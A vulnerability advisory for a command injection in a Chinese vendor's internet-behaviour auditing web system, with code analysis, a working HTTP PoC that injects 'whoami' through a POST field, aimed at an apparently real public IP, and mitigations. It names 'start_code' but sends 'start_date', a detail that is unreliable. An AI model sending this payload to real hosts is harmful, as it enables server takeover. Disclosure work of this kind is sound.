# Vulnerability Title
Command Execution Vulnerability in Shanghai Baud DATA Communicatior Co., Ltd. Internet Behavior Management and Auditing System (`log_operate_clear`)

---

# Vulnerability Overview
The Internet Behavior Management and Auditing System of Shanghai Baud DATA Communicatior Co., Ltd. contains a high-risk command execution vulnerability. Attackers can exploit this flaw by crafting a malicious `start_code` parameter and leveraging the system's insufficient input validation. This allows arbitrary system commands to be executed in the `log_operate_clear` module located in the `/webui/modules/log/operate.mds` file, potentially allowing full control of the server. This vulnerability can be triggered without authentication and directly impacts the security of core business data and continuity.

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739197227657-765d4192-a9c0-4565-870b-aa2faac45291.png)

---

# Code Analysis
First, review the `index.php` file under `/webui`. This file accepts a `g` parameter via GET and assigns it to the `$get_url_param` variable.

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739198948787-62bd3b5f-f62e-45af-9071-a3e78b2a707a.png)

In the `/webui/modules/log/operate.mds` file, when the `$get_url_param` parameter equals `log_operate_clear`, a `start_code` parameter is passed via POST and filtered through the `formatpost` function before being assigned to the `$param['start_code']` variable.

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739198956561-fd74bc47-3f71-4a6b-bee5-4933a22231d6.png)

Let's take a look at the filtering function, located in the `/webui/login.html` file. Its primary function is to remove spaces, `--Null`, `<script>` tags, and backslashes from the input, and then apply `htmlspecialchars()` to convert the input into HTML entities.

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739198964923-97f22931-3b5d-4c3e-babd-9393554ebad4.png)

Returning to the previous section, once filtered, if `$param['start_code']` exists, it is split into an array by spaces. The first element of the array has its slashes replaced with hyphens and is assigned to `$p1`, the second element is assigned to `$p2`, and these are concatenated in the `exec` function. Since `$param['start_code']` is user-controllable, this leads to command execution.

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739198972521-3c5169e5-b69f-4268-87e0-bcd04ab24af5.png)

# Proof of Concept
## 1. **Exploitation PoC**
The following HTTP request can be used to verify the vulnerability:

```http
POST /webui/?g=log_operate_clear HTTP/1.1
Host: 220.170.188.4
Cookie: tree_active=1; USGSESSID=1920624b691e1671d9c6038c2a616c22
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

start_date=2024/08/17;whoami|dd%20of=1.txt
```

**Result**:

+ The request successfully triggers command execution, writing the output of the `whoami` command to the `/webui/1.txt` file.
+ Visiting `http://220.170.188.4/webui/1.txt` confirms the command execution result (see screenshot).

## 2. **Code Analysis**
+ **Root Cause**: 
    1. The user-controlled `start_code` parameter is filtered using the `formatpost` function. However, the filtering logic only removes spaces, `<script>` tags, etc., and does not handle dangerous characters like pipe (`|`) and semicolon (`;`).
    2. The filtered parameter is split into an array, which is then concatenated and passed to the `exec` function, leading to command injection.
+ **Key Code Snippet**:

```php
// /webui/modules/log/operate.mds  
$param = formatpost($_POST);  
if (isset($param['start_code'])) {  
    $array = explode(' ', $param['start_code']);  
    $p1 = str_replace('/', '-', $array[0]);  
    $p2 = $array[1];  
    exec("clear_log $p1 $p2");  
}
```

## 3. **Reproduction Screenshots**
+ **Login Page**: [https://220.170.188.4/login.html](https://220.170.188.4/login.html)  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739197363417-a1fb750a-377a-49cd-b696-47ce260cbe49.png)
+ **Asset Proof**:

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739199209021-0be1f869-58a2-4764-8032-5ff0d2ee1a36.png)

+ **Command Execution Request**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739197384311-786571cd-60be-4932-885d-d0cf241f9ef3.png)
+ **Command Execution Result**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739197394694-a8a93adb-aacd-45e9-9558-05cf7682557f.png)

---

# Impact
1. **Complete Server Control**: Attackers can execute arbitrary commands (e.g., file reading/writing, process control) and fully take over the server.
2. **Sensitive Data Disclosure**: Command injection can be used to steal critical data such as user behavior logs, network configurations, database credentials, etc.
3. **Service Disruption Risk**: Malicious commands may cause system crashes or disable auditing features, affecting business continuity.
4. **Internal Network Lateral Movement**: Compromised servers can serve as a jumping-off point to attack other internal systems, expanding the attack surface.
5. **Legal and Compliance Risks**: This vulnerability violates the Cybersecurity Law and industry data protection regulations, potentially leading to regulatory penalties and reputation damage.

---

# Mitigation Strategy
1. **Input Filtering and Whitelist Mechanism**: 
    - Perform strict validation on the `start_code` parameter to prohibit dangerous characters like pipe (`|`) and semicolon (`;`).
    - Only allow valid values that conform to business logic (e.g., date format `YYYY/MM/DD`).
2. **Code-Level Fixes**: 
    - Use `escapeshellarg()` or `escapeshellcmd()` to handle external inputs, preventing direct command concatenation.
    - Replace the `exec` function with a more secure alternative (e.g., limiting command scope or using a dedicated log cleaning API).
3. **Minimal Privilege Principle**: 
    - Run the web service process with a non-privileged user, ensuring it does not have root or administrator privileges.
4. **Deploy Web Application Firewall (WAF)**: 
    - Configure rules to block requests containing sensitive keywords like `whoami`, `dd`, pipe symbols, etc.
5. **Security Auditing and Monitoring**: 
    - Regularly scan the system using automated tools (e.g., Nuclei, Nessus) for vulnerabilities.
    - Monitor server logs for abnormal command execution patterns (e.g., frequent calls to `clear_log`).

